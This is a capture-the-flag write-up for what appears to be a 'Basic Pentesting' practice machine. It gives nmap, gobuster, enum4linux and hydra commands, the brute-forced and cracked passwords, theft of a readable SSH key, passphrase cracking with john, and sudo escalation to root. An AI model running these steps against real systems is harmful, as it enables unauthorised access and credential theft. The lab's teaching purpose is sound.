# Basic Pentesting

## Deploy and connect
tick emoji
`export IP=<machine-ip>`

## Find the services exposed by the machine
`nmap -sC -sV -vvv -T5 --max-retries=25000 -oN nmapinitial $IP`
finds open ports:
22 - ssh
80 - apache web server
139 - samba 
445 - samba
8009 - ?
8080 - tomcat server panel?

## What is the name of the hidden directory on the web server?
`gobuster dir -u 10.10.191.48 -x txt,php,js,html,phtml,sh -t 30 -o gobusterscan -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`
immediately finds /development
answer:
```
development
```

### notes:
/development/j.txt:
```
For J:

I've been auditing the contents of /etc/shadow to make sure we don't have any weak credentials,
and I was able to crack your hash really easily. You know our password policy, so please follow
it? Change that password ASAP.

-K
```
/development/dev.txt:
```
2018-04-23: I've been messing with that struts stuff, and it's pretty cool! I think it might be neat
to host that on this server too. Haven't made any real web apps yet, but I have tried that example
you get to show off how it works (and it's the REST version of the example!). Oh, and right now I'm 
using version 2.5.12, because other versions were giving me trouble. -K

2018-04-22: SMB has been configured. -K

2018-04-21: I got Apache set up. Will put in our content later. -J
```

## User brute-forcing to find username and password
## What is the username?
(hint: smb)
found a new script for helping with this
`enum4linux -a $IP`
finds users kay, jan - and does other stuff
ans:
```
jan
```
## What is the password?
running hydra for this:
`hydra -l jan -P /usr/share/wordlists/rockyou.txt -s 8080 -f $IP http-get /manager/html`
finds:
```
armando
```

## What service do you use to access the server? 
```
ssh (port 22)
```
`ssh jan@$IP`
`armando`

we're in

## Enumerate the machine to find any vectors for privilege ascalation
linenum.sh

## What is the name of the other user you found? 
found way earlier,
```
kay
```

## If you have found another user, what can you do with this information?
### escalate:
kay's .ssh folder is readable for jan, meaning we can grab the id_rsa file
ssh -i id_rsa kay@$IP

turns out there's a passphrase.
googling how to decrypt shows us john the ripper has the capability to crack the passphrase
`locate ssh2john.py`
`python $(locate ssh2john.py) id_rsa > id_rsa.hash`
runs the ssh2john script, generates a compatible hash file
`/usr/sbin/john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash`
shows us the passphrase is 
```
beeswax
```
so via `ssh -i id_rsa kay@$IP` we can login with beesway, and we're now kay


## What is the final password you obtain?
In kay's home folder we see pass.bak
`cat pass.bak`
gives us password:
```
heresareallystrongpasswordthatfollowsthepasswordpolicy$$
```
to confirm:
`sudo -l` enter password - correct
kay can run ALL commands, kay access = root access
`sudo su` gives us real root

## Extra
there's a flag in /root! 
`cat /root/flag.txt`
